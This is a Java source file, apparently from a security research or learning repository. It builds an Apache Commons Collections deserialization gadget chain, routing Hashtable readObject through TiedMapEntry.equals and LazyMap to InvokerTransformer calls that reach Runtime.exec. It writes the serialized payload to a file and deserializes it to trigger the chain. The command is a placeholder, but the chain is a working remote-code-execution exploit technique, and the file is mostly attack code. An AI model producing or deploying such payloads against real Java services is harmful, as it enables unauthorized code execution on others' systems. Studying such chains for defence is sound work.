package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
/*
	Gadget chain:
		ObjectInputStream.readObject()
		      java.util.Hashtable.readObject()
                    java.util.Hashtable.reconstitutionPut()
                            TiedMapEntry.equals();
                                    TiedMapEntry.getValue()

                                        .get()
                                            ChainedTransformer.transform()
                                                ConstantTransformer.transform()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Class.getMethod()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Runtime.getRuntime()
                                                InvokerTransformer.transform()
                                                    Method.invoke()
                                                        Runtime.exec()
	Requires:
		commons-collections
 */
public class TiedMapEntry_equals {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"aaa"})
        };
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Map lazyMap1 = LazyMap.decorate(new HashMap(), transformerChain);
        Map lazyMap2 = LazyMap.decorate(new HashMap(), transformerChain);

        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(lazyMap1,transformers);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(lazyMap2,transformers);

        Hashtable hashtable = new Hashtable();
        SerializableTest.setFieldValue(hashtable,"count",2);

        Class nodeC = Class.forName("java.util.Hashtable$Entry");
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, tiedMapEntry1, "aaa", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, tiedMapEntry2, "bbb", null));
        SerializableTest.setFieldValue(hashtable, "table", tbl);

        SerializableTest.setFieldValue(transformerChain,"iTransformers",transformers);

        SerializableTest.searilze(hashtable,"TiedMapEntry_equals.bin");
        SerializableTest.unzearilze("TiedMapEntry_equals.bin");
    }
}
